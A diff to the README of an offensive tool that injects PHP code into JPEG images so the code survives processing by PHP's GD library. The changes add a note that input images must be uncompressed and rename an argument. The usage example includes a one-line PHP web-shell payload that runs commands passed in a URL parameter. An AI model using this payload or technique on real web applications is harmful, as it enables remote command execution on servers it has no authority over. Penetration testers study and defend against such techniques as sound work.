@@ -5,10 +5,10 @@ Injects php payloads into jpeg images. Related to [this post](https://github.com
 You have a web application that runs a jpeg image through PHP's GD graphics library.
 
 # Description
-This script injects PHP code into a specified jpeg image. The web application will execute the payload if it interprets the image.
+This script injects PHP code into a specified jpeg image. The web application will execute the payload if it interprets the image. Make sure your input jpeg is uncompressed!
 
 # Usage
-`python3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT]`
+`python3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT_JPEG]`
 
 e.g. `python3 gd-jpeg.py cat.jpeg '<?php system($_GET["cmd"]);?>' infected_cat.jpeg`
 
